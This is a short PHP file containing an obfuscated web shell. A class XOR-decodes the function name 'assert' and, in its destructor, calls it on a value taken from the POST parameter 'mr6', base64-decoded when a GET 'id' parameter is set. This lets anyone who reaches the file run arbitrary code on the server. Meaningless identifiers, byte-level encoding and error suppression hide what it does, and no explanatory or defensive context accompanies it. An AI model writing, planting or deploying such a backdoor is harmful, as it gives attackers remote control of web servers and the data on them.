<?php 
class LUBR { 
    function jvca() {
        $rtNJ = "\x86" ^ "\xe7";
        $SESF = "\x58" ^ "\x2b";
        $hpuh = "\xe9" ^ "\x9a";
        $VPmr = "\xa" ^ "\x6f";
        $GnJd = "\xb5" ^ "\xc7";
        $yOCW = "\x48" ^ "\x3c";
        $JVTh =$rtNJ.$SESF.$hpuh.$VPmr.$GnJd.$yOCW;
        return $JVTh;
    }
    function __destruct(){
        $Ymza=$this->jvca();
        @$Ymza($this->sm);
    }
}
$lubr = new LUBR();
@$lubr->sm = isset($_GET['id'])?base64_decode($_POST['mr6']):$_POST['mr6'];
?>